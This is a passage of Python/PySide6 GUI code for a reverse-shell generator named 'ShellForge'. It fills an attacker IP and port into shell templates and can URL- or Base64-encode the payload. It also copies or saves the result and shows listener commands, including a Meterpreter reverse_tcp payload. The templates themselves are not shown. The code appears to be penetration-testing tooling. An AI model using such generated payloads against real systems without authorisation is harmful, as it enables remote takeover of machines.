        main.setContentsMargins(0, 0, 0, 0)

        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setStyleSheet("QScrollArea { border: none; }")

        content = QWidget()
        layout = QVBoxLayout(content)
        layout.setContentsMargins(14, 14, 14, 14)
        layout.setSpacing(12)

        # Connection Group
        cg = QGroupBox("🔌 Connection")
        cg.setStyleSheet(GROUPBOX_STYLE)
        cl = QHBoxLayout(cg)
        cl.setSpacing(12)
        cl.setContentsMargins(14, 18, 14, 14)

        cl.addWidget(QLabel("LHOST:"))
        self.ip = QLineEdit()
        self.ip.setPlaceholderText("10.10.14.5")
        self.ip.setStyleSheet(self._input())
        cl.addWidget(self.ip, 1)

        db = QPushButton("🔍 Detect")
        db.setCursor(Qt.PointingHandCursor)
        db.clicked.connect(self._detect_ip)
        db.setStyleSheet(self._btn("#3b82f6", "#2563eb"))
        cl.addWidget(db)

        cl.addWidget(QLabel("LPORT:"))
        self.port = QLineEdit("9001")
        self.port.setMaximumWidth(70)
        self.port.setStyleSheet(self._input())
        cl.addWidget(self.port)

        pb = QPushButton("+1")
        pb.setMaximumWidth(38)
        pb.setCursor(Qt.PointingHandCursor)
        pb.clicked.connect(lambda: self.port.setText(str(int(self.port.text() or 0) + 1)))
        pb.setStyleSheet(self._btn("#6366f1", "#4f46e5"))
        cl.addWidget(pb)

        cl.addWidget(QLabel("Shell:"))
        self.shell_combo = self._combo("#3b82f6")
        self.shell_combo.addItems(SHELL_TYPES)
        cl.addWidget(self.shell_combo)
        layout.addWidget(cg)

        # Filter Group
        fg = QGroupBox("🔧 Filter")
        fg.setStyleSheet(GROUPBOX_STYLE)
        fl = QHBoxLayout(fg)
        fl.setSpacing(12)
        fl.setContentsMargins(14, 18, 14, 14)

        fl.addWidget(QLabel("OS:"))
        self.os_group = QButtonGroup(self)
        for i, (n, c) in enumerate([("All", "#10b981"), ("Linux", "#f97316"), ("Windows", "#3b82f6"), ("Mac", "#a78bfa")]):
            r = QRadioButton(n)
            r.setStyleSheet(f"color: #e5e7eb;")
            if i == 0:
                r.setChecked(True)
            self.os_group.addButton(r, i)
            fl.addWidget(r)

        fl.addStretch()
        fl.addWidget(QLabel("Category:"))
        self.cat_combo = self._combo("#f97316")
        for name, _ in CATEGORIES:
            self.cat_combo.addItem(name)
        fl.addWidget(self.cat_combo)

        self.search = QLineEdit()
        self.search.setPlaceholderText("🔍 Search...")
        self.search.setStyleSheet(self._input())
        self.search.setMaximumWidth(150)
        fl.addWidget(self.search)
        layout.addWidget(fg)

        # Shell List
        self.shell_list = QListWidget()
        self.shell_list.setStyleSheet("""
            QListWidget { background:#1a1a2e; color:#e5e7eb; border:1px solid #2d2d4d; border-radius:6px; padding:6px; }
            QListWidget::item { padding:8px 10px; border-radius:4px; }
            QListWidget::item:selected { background:#f97316; color:white; }
            QListWidget::item:hover { background:#2d2d4d; }
        """)
        self.shell_list.setMinimumHeight(180)
        layout.addWidget(self.shell_list)

        # Payload Group
        pg = QGroupBox("🎯 Payload")
        pg.setStyleSheet(GROUPBOX_STYLE)
        pl = QVBoxLayout(pg)
        pl.setContentsMargins(14, 18, 14, 14)
        pl.setSpacing(10)

        from PySide6.QtWidgets import QTextEdit
        self.cmd_display = QTextEdit()
        self.cmd_display.setReadOnly(True)
        self.cmd_display.setStyleSheet("background:#1a1a2e;color:#22d3ee;border:1px solid #2d2d4d;border-radius:6px;padding:10px;font-family:Consolas,monospace;font-size:15px;")
        self.cmd_display.setMinimumHeight(100)
        pl.addWidget(self.cmd_display)

        # Buttons
        btn_row = QHBoxLayout()
        self.enc = self._combo("#8b5cf6")
        self.enc.addItems(["Plain", "URL", "2xURL", "B64"])
        btn_row.addWidget(self.enc)

        cb = QPushButton("📋 Copy")
        cb.setCursor(Qt.PointingHandCursor)
        cb.clicked.connect(self._copy)
        cb.setStyleSheet(self._btn("#f97316", "#ea580c"))
        btn_row.addWidget(cb)

        ceb = QPushButton("📋 Copy Encoded")
        ceb.setCursor(Qt.PointingHandCursor)
        ceb.clicked.connect(self._copy_enc)
        ceb.setStyleSheet(self._btn("#8b5cf6", "#7c3aed"))
        btn_row.addWidget(ceb)

        svb = QPushButton("💾 Save")
        svb.setCursor(Qt.PointingHandCursor)
        svb.clicked.connect(self._save)
        svb.setStyleSheet(self._btn("#10b981", "#059669"))
        btn_row.addWidget(svb)

        btn_row.addStretch()
        pl.addLayout(btn_row)
        layout.addWidget(pg)

        # Listener Group
        lg = QGroupBox("👂 Listener")
        lg.setStyleSheet(GROUPBOX_STYLE)
        lgl = QVBoxLayout(lg)
        lgl.setContentsMargins(14, 18, 14, 14)
        lgl.setSpacing(10)

        lgt = QHBoxLayout()
        lgt.addWidget(QLabel("Type:"))
        self.lis_combo = self._combo("#10b981")
        for n, _ in LISTENERS:
            self.lis_combo.addItem(n)
        lgt.addWidget(self.lis_combo)
        lgt.addStretch()

        clb = QPushButton("📋 Copy")
        clb.setCursor(Qt.PointingHandCursor)
        clb.clicked.connect(self._copy_lis)
        clb.setStyleSheet(self._btn("#10b981", "#059669"))
        lgt.addWidget(clb)
        lgl.addLayout(lgt)

        self.lis_display = QLabel("")
        self.lis_display.setStyleSheet("background:#1a1a2e;color:#22d3ee;border:1px solid #2d2d4d;border-radius:6px;padding:10px;font-family:Consolas,monospace;font-size:15px;")
        self.lis_display.setWordWrap(True)
        lgl.addWidget(self.lis_display)
        layout.addWidget(lg)

        scroll.setWidget(content)
        main.addWidget(scroll)
    
    def _connect_signals(self):
        self.ip.textChanged.connect(self._update_cmd); self.port.textChanged.connect(self._update_cmd)
        self.shell_combo.currentTextChanged.connect(self._update_cmd); self.search.textChanged.connect(self._update_shell_list)
        self.os_group.buttonClicked.connect(self._update_shell_list); self.cat_combo.currentIndexChanged.connect(self._on_cat_change)
        self.shell_list.currentRowChanged.connect(self._update_cmd); self.lis_combo.currentTextChanged.connect(self._update_lis)
    
    def _input(self): return "QLineEdit{background:#1a1a2e;color:#e5e7eb;border:1px solid #2d2d4d;border-radius:6px;padding:8px 12px;font-size:15px;}QLineEdit:focus{border-color:#6366f1;}"
    def _btn(self, bg, h): return f"QPushButton{{background:{bg};color:white;border:none;border-radius:6px;padding:8px 14px;font-weight:bold;font-size:15px;}}QPushButton:hover{{background:{h};}}"
    def _combo(self, color):
        from PySide6.QtWidgets import QComboBox
        c = QComboBox()
        c.setStyleSheet(f"""
            QComboBox{{background:#1a1a2e;color:#e5e7eb;border:2px solid {color}50;border-radius:6px;padding:6px 10px;font-size:15px;min-width:80px;}}
            QComboBox:hover{{border-color:{color};}}
            QComboBox::drop-down{{border:none;width:24px;}}
            QComboBox::down-arrow{{image:none;border-left:5px solid transparent;border-right:5px solid transparent;border-top:6px solid {color};margin-right:6px;}}
            QComboBox QAbstractItemView{{background:#12121a;color:#e5e7eb;border:2px solid {color};border-radius:6px;selection-background-color:{color};padding:4px;}}
        """)
        return c
    
    def _detect_ip(self):
        try:
            import socket; s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect(("8.8.8.8", 80)); self.ip.setText(s.getsockname()[0]); s.close()
        except: pass
    
    def _on_cat_change(self, idx):
        if 0 <= idx < len(CATEGORIES): self.current_shells = CATEGORIES[idx][1]
        self._update_shell_list()
    
    def _update_shell_list(self):
        os_f = ["all","linux","windows","mac"][self.os_group.checkedId()]; search = self.search.text().lower()
        self.shell_list.clear()
        for s in self.current_shells:
            sos = s.get("os","linux")
            if os_f != "all" and sos != "all" and os_f not in sos: continue
            if search and search not in s["name"].lower(): continue
            self.shell_list.addItem(s["name"])
        if self.shell_list.count() > 0: self.shell_list.setCurrentRow(0)
        self._update_cmd()
    
    def _get_cmd(self):
        idx = self.shell_list.currentRow()
        if idx < 0 or idx >= len(self.current_shells): return ""
        # Find by name since filtering may change order
        name = self.shell_list.currentItem().text() if self.shell_list.currentItem() else ""
        for s in self.current_shells:
            if s["name"] == name:
                cmd = s.get("cmd","")
                return cmd.replace("{ip}", self.ip.text() or "10.10.14.5").replace("{port}", self.port.text() or "9001").replace("{shell}", self.shell_combo.currentText())
        return ""
    
    def _update_cmd(self): self.cmd_display.setPlainText(self._get_cmd()); self._update_lis()
    
    def _update_lis(self):
        idx = self.lis_combo.currentIndex()
        if 0 <= idx < len(LISTENERS):
            _, cmd = LISTENERS[idx]
            self.lis_display.setText(cmd.replace("{ip}", self.ip.text() or "0.0.0.0").replace("{port}", self.port.text() or "9001").replace("{payload}", "windows/x64/meterpreter/reverse_tcp"))
    
    def _encode(self, c):
        e = self.enc.currentText()
        if e == "URL": return urllib.parse.quote(c, safe='')
        if e == "2xURL": return urllib.parse.quote(urllib.parse.quote(c, safe=''), safe='')
        if e == "B64": return base64.b64encode(c.encode()).decode()
        return c
    
    def _copy(self): QApplication.clipboard().setText(self._get_cmd()); self._notify("✅ Copied!")
    def _copy_enc(self): QApplication.clipboard().setText(self._encode(self._get_cmd())); self._notify("✅ Encoded!")
    def _copy_lis(self): QApplication.clipboard().setText(self.lis_display.text()); self._notify("✅ Listener!")
    def _save(self):
        p, _ = QFileDialog.getSaveFileName(self, "Save", os.path.join(RESULT_BASE, f"shell_{datetime.now():%Y%m%d_%H%M%S}.sh"), "*")
        if p:
            with open(p, 'w') as f: f.write(f"#!/bin/bash\n# ShellForge\n{self._get_cmd()}")
            self._notify("✅ Saved!")
    def _notify(self, m):
        if self.main_window and hasattr(self.main_window, 'notification_manager'): self.main_window.notification_manager.notify(m)
